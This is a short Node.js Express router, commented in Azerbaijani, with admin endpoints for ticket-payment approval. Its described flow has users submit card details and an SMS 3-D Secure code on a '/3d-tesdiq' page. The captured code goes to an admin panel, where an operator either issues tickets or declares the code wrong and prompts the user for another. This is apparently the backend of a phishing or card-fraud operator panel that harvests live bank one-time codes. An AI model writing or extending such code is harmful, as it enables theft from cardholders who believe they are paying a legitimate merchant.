/* Admin API Endpoints - Sadələşdirilmiş Versiya */

const express = require('express');
const { requireAdmin } = require('../middleware/auth');
const { Payment, Order, User } = require('../models/index');
const paymentService = require('../services/paymentService');

const api = express.Router();

/* 
  SƏDƏLƏŞDİRİLMİŞ AXIN:
  
  1. User: Kart + SMS 3D kodu daxil → "Ödə" basır
  2. Backend: OTP otomatik yaradılır
  3. User: /3d-tesdiq əkranında OTP daxil edir
  4. Backend: submittedCode qeyd olunur → Admin panelinə düşür
  5. Admin: İKİ SEÇIM:
     a) "Bilet Ver" → Biletlər verilir
     b) "Səhv Kod" → Yeni OTP, User yenidən cəhd edir
*/

/* Admin - Bilet Ver (Uğurlu Ödəniş) */
api.post('/admin/payments/:id/approve-final', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: '✅ Biletlər uğurla verildi.',
      pnr: result.tickets && result.tickets.length ? result.tickets[0].pnr : '',
      ticketCount: result.tickets ? result.tickets.length : 0
    });
  } catch (e) {
    return res.status(e.status || 500).json({ 
      ok: false, 
      message: e.message || 'Əməliyyat alınmadı' 
    });
  }
});

/* Admin - Səhv Kod (Yeni OTP) */
api.post('/admin/payments/:id/reject-otp', requireAdmin, async (req, res) => {
  try {
    const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
    return res.json({
      ok: true,
      message: '❌ Səhv OTP - Yeni kod yaradıldı. İstifadəçi yenidən cəhd edəcək.',
      code: result.code  // Yeni OTP (admin üçün qeyd)
    });
  } catch (e) {
    return res.status(e.status || 500).json({ 
      ok: false, 
      message: e.message || 'Əməliyyat alınmadı' 
    });
  }
});

/* Admin - Ödənişi Rədd Et */
api.post('/admin/payments/:id/decline', requireAdmin, async (req, res) => {
  try {
    await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
    return res.json({ 
      ok: true, 
      message: 'Ödəniş rədd edildi.' 
    });
  } catch (e) {
    return res.status(e.status || 500).json({ 
      ok: false, 
      message: e.message || 'Əməliyyat alınmadı' 
    });
  }
});

module.exports = api;
